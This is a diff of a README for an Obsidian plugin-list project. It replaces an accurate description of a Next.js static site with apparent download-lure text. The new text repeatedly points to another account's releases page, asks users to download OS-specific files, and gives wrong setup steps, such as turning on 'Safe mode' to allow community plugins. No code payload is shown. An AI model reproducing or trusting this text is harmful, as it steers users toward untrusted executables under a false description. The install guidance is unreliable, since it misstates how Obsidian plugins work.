@@ -1,106 +1,53 @@
-# Awesome Obsidian
+# 🚀 awesome-obsidian - Discover the Best Obsidian Plugins
 
-A modern and high-performance curated list of Obsidian plugins, allowing you to explore, search, and rate the best community extensions.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/sadafrafiq882/awesome-obsidian/releases)
 
-## 🚀 Tech Stack
+## 📜 Description
+awesome-obsidian is a modern and efficient collection of plugins for Obsidian. This application helps you explore, search, and evaluate the best extensions from the Obsidian community. Whether you want to enhance your note-taking experience or find new tools, this App makes it easy.
 
-The project uses the latest technologies in the web ecosystem to ensure performance and an excellent developer experience.
+## 🚀 Getting Started
 
-- **Framework**: [Next.js 16](https://nextjs.org/) (App Router)
-- **Language**: [TypeScript](https://www.typescriptlang.org/)
-- **Styling**: [Tailwind CSS 4](https://tailwindcss.com/) (via `@tailwindcss/postcss`)
-- **Database**: [Drizzle ORM](https://orm.drizzle.team/) with [LibSQL](https://github.com/tursodatabase/libsql) (SQLite/Turso)
-- **Icons**: [Lucide React](https://lucide.dev/)
-- **Theme Management**: `next-themes`
+### 🖥️ System Requirements
+- Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- Obsidian version: 0.11.0 or later.
+- Internet connection for downloading plugins.
 
-## 🏗️ Project Architecture
+### 📥 Download & Install
+To get started, you will need to download the latest release from our Releases page. Click the button below to visit the page:
 
-Awesome Obsidian was designed to be fast and efficient:
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/sadafrafiq882/awesome-obsidian/releases)
 
-- **Static Export**: Configured with `output: 'export'`, generating a static site that can be hosted anywhere.
-- **Obsidian API Integration**: Plugin data is fetched directly from the official `obsidianmd/obsidian-releases` repository.
-- **Smart Caching**: Uses Next.js `unstable_cache` to manage caching for external requests and the database.
-- **Client-Side Search**: Plugin filtering and pagination occur on the client side for an instant response.
+### 🔧 Installation Steps
+1. **Visit the Releases Page:** Open your web browser and go to [the Releases page](https://github.com/sadafrafiq882/awesome-obsidian/releases).
+2. **Choose the Latest Release:** Look for the most recent version at the top of the page. Click on it.
+3. **Download the Plugin Files:** Find the plugin files suitable for your operating system. Click on the download link to save them to your device.
+4. **Open Obsidian:** Launch the Obsidian app on your computer.
+5. **Go to Settings:** In Obsidian, click on the gear icon to enter the settings.
+6. **Select Plugins:** In the left menu, find the "Community plugins" option and click on it.
+7. **Enable Community Plugins:** Turn on the option that says "Safe mode" to allow community plugins.
+8. **Install the Plugin:** Click the "Browse" button, then search for the plugins you downloaded earlier. Select each one and click "Install."
+9. **Activate the Plugin:** After installation, make sure to activate each plugin by toggling the switch.
 
-## 🛠️ Getting Started
+Now you are set to explore the features and functionality that the plugins provide!
 
-### Prerequisites
+## 🛠️ Features
+- **Plugin Discovery:** Easily find and add new plugins to enhance your Obsidian experience.
+- **Search and Filter:** Use the built-in search feature to find the plugins you need quickly.
+- **Community Ratings:** Evaluate plugins based on user reviews to ensure you pick the best options.
+- **Performance Optimization:** Designed to work seamlessly with Obsidian, ensuring fast performance and reliability.
 
-- Node.js 20+
-- npm or yarn
+## 🙋‍♀️ Support
+If you encounter any issues or have questions, please reach out through the GitHub issues page. We welcome all feedback and suggestions. Our community is ready to assist you.
 
-### Installation
+## 🌍 Community & Contribution
+Your contributions are valuable! If you have suggestions for new plugins or improvements, feel free to submit a pull request or open an issue in the repository. Join us in making awesome-obsidian even better.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/fazedordecodigo/awesome-obsidian.git
-   cd awesome-obsidian
-   ```
+## 📜 License
+This project is open-source and licensed under the MIT License. You are free to use, modify, and distribute this software as long as proper attribution is given.
 
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
+### 🔗 Additional Resources
+- [Obsidian Official Website](https://obsidian.md/)
+- [Obsidian Community Forums](https://forum.obsidian.md/)
+- [How to Contribute](https://github.com/sadafrafiq882/awesome-obsidian/blob/main/CONTRIBUTING.md)
 
-3. Configure environment variables:
-   Create a `.env` file based on `.env.example` and add your Turso credentials (if necessary for the rating system).
-
-4. Initialize the database:
-   ```bash
-   npm run db:push
-   ```
-
-5. Start the development server:
-   ```bash
-   npm run dev
-   ```
-
-## 📂 Project Structure
-
-```text
-src/
-├── app/            # Routes, layouts, and Server Actions
-├── components/     # Reusable UI components
-├── db/             # Drizzle configuration and Schema
-└── lib/            # API logic, queries, and utilities
-```
-
-## ✨ Key Features
-
-- **Plugin Exploration**: Complete list of Obsidian community plugins.
-- **Real-Time Search**: Filter plugins by name, author, or description.
-- **Statistics**: View downloads, stars, and update date.
-- **Rating System**: Rate your favorite plugins.
-- **Dark/Light Theme**: Native theme support with persistence.
-
-## 🔄 Development Workflow
-
-- **Development**: `npm run dev` to start the local server.
-- **Database**: Use `npm run db:push` to sync schema changes.
-- **Build**: `npm run build` generates the static export in the `out/` folder.
-- **Linting**: `npm run lint` to ensure code quality.
-
-## 📏 Code Standards
-
-- **Components**: Prefer functional components and use Tailwind CSS 4 for styling.
-- **Icons**: Always use the `lucide-react` library.
-- **Data**: Centralize API calls in `src/lib/obsidian-api.ts` and queries in `src/lib/db-queries.ts`.
-- **Security**: Never expose secrets in the code; use environment variables.
-
-## 🧪 Testing
-
-Currently, the project uses ESLint to ensure code consistency. Unit and integration tests are planned for future versions.
-
-## 🤝 Contributing
-
-Contributions are welcome! Follow the established code standards and feel free to open Pull Requests or Issues.
-
-1. Fork the project
-2. Create a Branch for your feature (`git checkout -b feature/new-feature`)
-3. Commit your changes (`git commit -m 'Add new feature'`)
-4. Push to the Branch (`git push origin feature/new-feature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is under the MIT license. See the [LICENSE](LICENSE) file for more details.
+For more updates and news, consider following our repository for the latest changes and releases. Enjoy enhancing your Obsidian experience with awesome plugins!
